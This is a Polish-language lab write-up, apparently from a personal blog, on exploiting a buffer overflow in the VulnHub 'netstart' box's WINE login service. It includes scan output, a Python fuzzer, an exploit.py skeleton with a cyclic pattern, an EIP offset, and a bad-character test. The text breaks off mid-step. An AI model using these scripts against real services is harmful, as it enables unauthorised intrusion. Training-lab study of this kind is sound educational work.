<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>netstart | Mateusz Suszczyk</title>
<meta name="keywords" content="Linux, Easy, Buffer Overflow" />
<meta name="description" content="This is a Linux box, running a WINE Application vulnerable to Buffer Overflow, escalation is pretty simple.">
<meta name="author" content="Mateusz Suszczyk">
<link rel="canonical" href="https://suszczyk.github.io/posts/vulnhub/netstart/" />
<link crossorigin="anonymous" href="../../../assets/css/stylesheet.min.05ec22396353f5838fc267c8a7e9d490b0f9679d599623d1abcb52b3a80b2af6.css" integrity="sha256-BewiOWNT9YOPwmfIp&#43;nUkLD5Z51ZliPRq8tSs6gLKvY=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="../../../assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js" integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5&#43;kdJvBz5iKbt6B5PJI="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://suszczyk.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://suszczyk.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://suszczyk.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://suszczyk.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="https://suszczyk.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<meta name="generator" content="Hugo 0.92.2" />
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="netstart" />
<meta property="og:description" content="This is a Linux box, running a WINE Application vulnerable to Buffer Overflow, escalation is pretty simple." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://suszczyk.github.io/posts/vulnhub/netstart/" />
<meta property="og:image" content="https://suszczyk.github.io/thumbnails/netstart.png" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-09-05T00:00:00&#43;00:00" />
<meta property="article:modified_time" content="2022-09-05T00:00:00&#43;00:00" />

<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://suszczyk.github.io/thumbnails/netstart.png" />
<meta name="twitter:title" content="netstart"/>
<meta name="twitter:description" content="This is a Linux box, running a WINE Application vulnerable to Buffer Overflow, escalation is pretty simple."/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Posts",
      "item": "https://suszczyk.github.io/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "netstart",
      "item": "https://suszczyk.github.io/posts/vulnhub/netstart/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "netstart",
  "name": "netstart",
  "description": "This is a Linux box, running a WINE Application vulnerable to Buffer Overflow, escalation is pretty simple.",
  "keywords": [
    "Linux", "Easy", "Buffer Overflow"
  ],
  "articleBody": "Zaczynam od znalezienia IP maszyny.\nnetdiscover ‚îå[parrot@parrot]‚îÄ[/opt/twint] ‚îî‚ïº[‚òÖ ]$sudo netdiscover -r 192.168.2.0/24 Currently scanning: Finished! | Screen View: Unique Hosts 8 Captured ARP Req/Rep packets, from 5 hosts. Total size: 480 _____________________________________________________________________________ IP At MAC Address Count Len MAC Vendor / Hostname ----------------------------------------------------------------------------- 192.168.2.1 00:50:56:c0:00:08 4 240 VMware, Inc. 192.168.2.2 00:50:56:f0:ed:fa 1 60 VMware, Inc. 192.168.2.130 00:0c:29:a9:6b:27 1 60 VMware, Inc. 192.168.2.148 00:0c:29:0a:3a:b3 1 60 VMware, Inc. 192.168.2.254 00:50:56:f3:5b:b0 1 60 VMware, Inc. IP maszyny Vulnhub: 192.168.2.148. IP Windowsa z Immunity Debugger: 192.168.2.130 IP mojego Linuxa, z kt√≥rego atakujƒô: 192.168.2.128\n NMap nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /home/parrot/vulnhub/netstart/results/scans/results/scans/_full_tcp_nmap.txt -oX /home/parrot/vulnhub/netstart/results/scans/results/scans/xml/_full_tcp_nmap.xml 192.168.2.148 Nmap scan report for 192.168.2.148 Host is up, received arp-response (0.0036s latency). Scanned at 2022-08-30 22:34:24 CEST for 63s Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack ttl 64 vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) | -rw-r--r-- 1 0 0 50992 Nov 16 2020 login.exe |_-rw-r--r-- 1 0 0 28613 Nov 16 2020 login_support.dll | ftp-syst: | STAT: | FTP server status: | Connected to 192.168.2.128 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 1 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 2371/tcp open worldwire? syn-ack ttl 64 | fingerprint-strings: | Arucer, DNSStatusRequestTCP, DNSVersionBindReqTCP, DistCCD, FourOhFourRequest, GenericLines, GetRequest, HELP4STOMP, HTTPOptions, Hello, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, Memcache, NCP, NULL, NessusTPv10, NessusTPv11, NessusTPv12, NotesRPC, OfficeScan, RPCCheck, RTSPRequest, Radmin, SIPOptions, SMBProgNeg, SSLSessionReq, SSLv23SessionReq, Socks4, Socks5, SqueezeCenter_CLI, TLSSessionReq, TerminalServer, TerminalServerCookie, Verifier, VerifierAdvanced, WMSRequest, WWWOFFLEctrlstat, X11Probe, ZendJavaBridge, afp, ajp, apple-iphoto, beast2, dominoconsole, drda, firebird, gkrellm, hp-pjl, ibm-db2, ibm-db2-das, ibm-mqseries, informix, metasploit-xmlrpc, ms-sql-s, mydoom, oracle-tns, pervasive-btrieve, pervasive-relational: |_ Password: 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port2371-TCP:V=7.92%I=9%D=8/30%Time=630E748E%P=x86_64-pc-linux-gnu%r(NU SF:LL,B,\"Password:\\n\\0\")%r(GenericLines,B,\"Password:\\n\\0\")%r(GetRequest,B, SF:\"Password:\\n\\0\")%r(HTTPOptions,B,\"Password:\\n\\0\")%r(RTSPRequest,B,\"Pass SF:word:\\n\\0\")%r(RPCCheck,B,\"Password:\\n\\0\")%r(DNSVersionBindReqTCP,B,\"Pas SF:sword:\\n\\0\")%r(DNSStatusRequestTCP,B,\"Password:\\n\\0\")%r(Hello,B,\"Passwo SF:rd:\\n\\0\")%r(Help,B,\"Password:\\n\\0\")%r(SSLSessionReq,B,\"Password:\\n\\0\")% SF:r(TerminalServerCookie,B,\"Password:\\n\\0\")%r(TLSSessionReq,B,\"Password:\\ SF:n\\0\")%r(SSLv23SessionReq,B,\"Password:\\n\\0\")%r(Kerberos,B,\"Password:\\n\\0 SF:\")%r(SMBProgNeg,B,\"Password:\\n\\0\")%r(X11Probe,B,\"Password:\\n\\0\")%r(Four SF:OhFourRequest,B,\"Password:\\n\\0\")%r(LPDString,B,\"Password:\\n\\0\")%r(LDAPS SF:earchReq,B,\"Password:\\n\\0\")%r(LDAPBindReq,B,\"Password:\\n\\0\")%r(SIPOptio SF:ns,B,\"Password:\\n\\0\")%r(LANDesk-RC,B,\"Password:\\n\\0\")%r(TerminalServer, SF:B,\"Password:\\n\\0\")%r(NCP,B,\"Password:\\n\\0\")%r(NotesRPC,B,\"Password:\\n\\0 SF:\")%r(DistCCD,B,\"Password:\\n\\0\")%r(JavaRMI,B,\"Password:\\n\\0\")%r(Radmin,B SF:,\"Password:\\n\\0\")%r(NessusTPv12,B,\"Password:\\n\\0\")%r(NessusTPv11,B,\"Pas SF:sword:\\n\\0\")%r(NessusTPv10,B,\"Password:\\n\\0\")%r(WMSRequest,B,\"Password: SF:\\n\\0\")%r(oracle-tns,B,\"Password:\\n\\0\")%r(mydoom,B,\"Password:\\n\\0\")%r(WW SF:WOFFLEctrlstat,B,\"Password:\\n\\0\")%r(Verifier,B,\"Password:\\n\\0\")%r(Verif SF:ierAdvanced,B,\"Password:\\n\\0\")%r(Socks5,B,\"Password:\\n\\0\")%r(Socks4,B,\" SF:Password:\\n\\0\")%r(OfficeScan,B,\"Password:\\n\\0\")%r(ms-sql-s,B,\"Password: SF:\\n\\0\")%r(HELP4STOMP,B,\"Password:\\n\\0\")%r(Memcache,B,\"Password:\\n\\0\")%r( SF:beast2,B,\"Password:\\n\\0\")%r(firebird,B,\"Password:\\n\\0\")%r(ibm-db2-das,B SF:,\"Password:\\n\\0\")%r(ibm-db2,B,\"Password:\\n\\0\")%r(pervasive-relational,B SF:,\"Password:\\n\\0\")%r(pervasive-btrieve,B,\"Password:\\n\\0\")%r(ajp,B,\"Passw SF:ord:\\n\\0\")%r(hp-pjl,B,\"Password:\\n\\0\")%r(afp,B,\"Password:\\n\\0\")%r(Squee SF:zeCenter_CLI,B,\"Password:\\n\\0\")%r(Arucer,B,\"Password:\\n\\0\")%r(dominocon SF:sole,B,\"Password:\\n\\0\")%r(informix,B,\"Password:\\n\\0\")%r(drda,B,\"Passwor SF:d:\\n\\0\")%r(ibm-mqseries,B,\"Password:\\n\\0\")%r(apple-iphoto,B,\"Password:\\ SF:n\\0\")%r(ZendJavaBridge,B,\"Password:\\n\\0\")%r(gkrellm,B,\"Password:\\n\\0\")% SF:r(metasploit-xmlrpc,B,\"Password:\\n\\0\"); MAC Address: 00:0C:29:0A:3A:B3 (VMware) Device type: general purpose Running: Linux 4.X|5.X OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 OS details: Linux 4.15 - 5.6 TCP/IP fingerprint: OS:SCAN(V=7.92%E=4%D=8/30%OT=21%CT=1%CU=41661%PV=Y%DS=1%DC=D%G=Y%M=000C29%T OS:M=630E748F%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10B%TI=Z%CI=Z%II=I OS:%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O OS:5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6 OS:=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD= OS:0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0% OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1( OS:R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI= OS:N%T=40%CD=S) Uptime guess: 47.273 days (since Thu Jul 14 16:02:08 2022) Network Distance: 1 hop TCP Sequence Prediction: Difficulty=260 (Good luck!) IP ID Sequence Generation: All zeros Service Info: OS: Unix Mamy dwa otwarte porty: 21 oraz 2371. Widzimy ju≈º ze skanu nmapa, ≈ºe na ftp mamy dwa pliki potrzebne do Buffer Overflow. Sprawdzi≈Çem te≈º port 2171.\nPort po zapytaniu prosi o has≈Ço.\n‚îå[parrot@parrot]‚îÄ[~/vulnhub/netstart] ‚îî‚ïº[‚òÖ ]$nc 192.168.2.148 2371 Password: test  Windows 10 + login.exe Przygotowa≈Çem wcze≈õniej ≈õrodowisko, na kt√≥rym przeprowadzƒô exploit. IP Windowsa to 192.168.2.130. Uruchomi≈Çem aplikacjƒô w programie Immunity Debugger. Teraz przy pr√≥bie po≈ÇƒÖczenia na porcie 2371 otrzymujemy zapytanie o has≈Ço, czyli wszystko jest w porzƒÖdku.\nPrzystƒôpujƒô do dzia≈Çania. Zaczynam od fuzzingu portu. Sprawdzƒô na ilu przygotowanych bajtach ciƒÖgu liter A program siƒô wysypie.\n fuzzer.py #!/usr/bin/env python3 import socket, time, sys ip = \"192.168.2.130\" port = 2371 timeout = 5 prefix = \"\" string = prefix + \"A\" * 100 while True: try: with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s: s.settimeout(timeout) s.connect((ip, port)) s.recv(1024) print(\"Fuzzing with {}bytes\".format(len(string) - len(prefix))) s.send(bytes(string, \"latin-1\")) s.recv(1024) except: print(\"Fuzzing crashed at {}bytes\".format(len(string) - len(prefix))) sys.exit(0) string += 100 * \"A\" time.sleep(1) Jak widaƒá nasz skrypt ma ustawione IP oraz port na Windowsa z naszym pliczkiem .exe. Dzia≈Çanie jest proste, poniewa≈º skrypt pr√≥buje wej≈õƒá na ten okre≈õlony port i wysy≈Ça okre≈õlonƒÖ liczbƒô bajt√≥w ciƒÖgu znak√≥w A a≈º program siƒô scrashuje. Je≈ºeli program siƒô wy≈ÇƒÖczy, skrypt podaje po ilu set takich A nastƒÖpi≈Ç ten crash.\nDzia≈Çanie skryptu:\n‚îå[parrot@parrot]‚îÄ[~/vulnhub/netstart/buff] ‚îî‚ïº[‚òÖ ]$python3 fuzzer.py Fuzzing with 100 bytes Fuzzing with 200 bytes Fuzzing with 300 bytes Fuzzing with 400 bytes Fuzzing with 500 bytes Fuzzing with 600 bytes Fuzzing with 700 bytes Fuzzing with 800 bytes Fuzzing with 900 bytes Fuzzing with 1000 bytes Fuzzing with 1100 bytes Fuzzing with 1200 bytes Fuzzing with 1300 bytes Fuzzing with 1400 bytes Fuzzing with 1500 bytes Fuzzing with 1600 bytes Fuzzing with 1700 bytes Fuzzing crashed at 1700 bytes Jak widaƒá juz po 1700 bajtach scrashowa≈Ço program. Widaƒá to r√≥wnie≈º w Windowsie w Immunity Debuggerze.\nTeraz kiedy ju≈º znamy tƒÖ liczbƒô, mo≈ºemy stworzyƒá specjalny pattern, przez co ustalimy dalsze kroki dzia≈Çania. U≈ºyjƒô do tego narzƒôdzia z pakietu Metasploit a dok≈Çadnie pattern_create.rb.\n‚îå[parrot@parrot]‚îÄ[~/vulnhub/netstart/buff] ‚îî‚ïº[‚òÖ ]$/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1800 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9  exploit.py import socket ip = \"192.168.2.130\" port = 2371 prefix = \"\" offset = 0 overflow = \"A\" * offset retn = \"\" padding = \"\" payload=\"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9\" postfix = \"\" buffer = prefix + overflow + retn + padding + payload + postfix s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: s.connect((ip, port)) print(\"Sending evil buffer...\") s.send(bytes(buffer + \"\\r\\n\", \"latin-1\")) print(\"Done!\") except: print(\"Could not connect.\") Mamy podobny program do tego poprzedniego, jednak tutaj bƒôdzie dzia≈Ço siƒô wiele wiƒôcej. Z najwa≈ºniejszych rzeczy mamy IP, port, offset, retn, padding, payload. Ka≈ºdƒÖ z tych zmiennych bƒôdziemy modyfikowaƒá. Oczywi≈õcie poza IP oraz portem.\nDzia≈Çanie programu:\n‚îå[parrot@parrot]‚îÄ[~/vulnhub/netstart/buff] ‚îî‚ïº[‚òÖ ]$python3 exploit.py Sending evil buffer... Done! Ca≈Ço≈õƒá zadzia≈Ça siƒô na Windowsie. Program scrashowa≈Ç, co jest dla nas dobrym znakiem. Teraz korzystamy z modu≈Çu mona w Immunity Debugger.\n!mona findmsp -distance 1800 Dla nas najwa≈ºniejsze jest dostanie siƒô do EIP. Komenda powy≈ºej umo≈ºliwia nam odkrycie zmiennej offset. Jest to pierwsza potrzebna zmienna do kontynuacji eksploitacji. Zaznaczona linia na screenshocie zawiera ciƒÖg offset 1702.\nTeraz gdy ju≈º mam tƒÖ danƒÖ, modyfikujƒô i ustawiam:\n offset = ‚Äú1702‚Äù payload = \"\" retr = ‚ÄúBBBB‚Äù  Dziƒôki ostatniej zmiennej retr sprawdzƒô, czy wszystko idzie zgodnie z planem, ale o tym zaraz.\nPo uruchomieniu widzimy, ≈ºe EAX jest nadpisany samymi A a EIP zosta≈Ço wpisane tajemnicze 42424242. Jak siƒô okazuje, jest to ciƒÖg znak√≥w BBBB, ale zapisany w systemie szesnastkowym. W ten spos√≥b sprawdzi≈Çem, czy to co wpiszƒô w retr faktycznie zostanie wpisane w rejestr EIP. Teraz mamy ju≈º po≈Çowƒô sukcesu.\nNastƒôpny krok to sprawdzenie tzw. bad characters. W tym celu pod zmiennƒÖ payload zapisujƒô taki ciƒÖg znak√≥w.\n\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff SƒÖ to zapisane szesnastkowo kolejne znaki od 0,1,2,‚Ä¶a,b,c,‚Ä¶,A,B,C,Z‚Ä¶\nMniej wiƒôcej tak wyglƒÖdajƒÖ te znaki. Wiƒôkszo≈õƒá jest czytelna, ale to nie jest istotne.\nGenerowanie .bin do por√≥wnywania bez okre≈õlonych znak√≥w:\n!mona bytearray -b \"\\x00\" Po ka≈ºdym crashu kopiowa≈Çem adres ESP i por√≥wnywa≈Çem wyniki.\n!mona compare -f \"C:\\Program Files (x86)\\Immunity Inc\\Immunity Debugger\\bytearray.bin\" -a 0107FB48 BadChars = \"00 01 02 03 04 2d\"\nW tym przypadku konsola pokazywa≈Ça dziwne wyniki, gdy usuwa≈Çem kolejne chary. Bardziej sugerowa≈Çem siƒô poprzez Follow in Dump rejestru ESP.\nOczywi≈õcie wspomaga≈Çem siƒô te≈º por√≥wnywaniem w konsoli, za ka≈ºdym razem generujƒÖc za ka≈ºdym razem nowy plik .bin i usuwajƒÖc kolejne bad chary.\n!mona compare -f \"C:\\Program Files 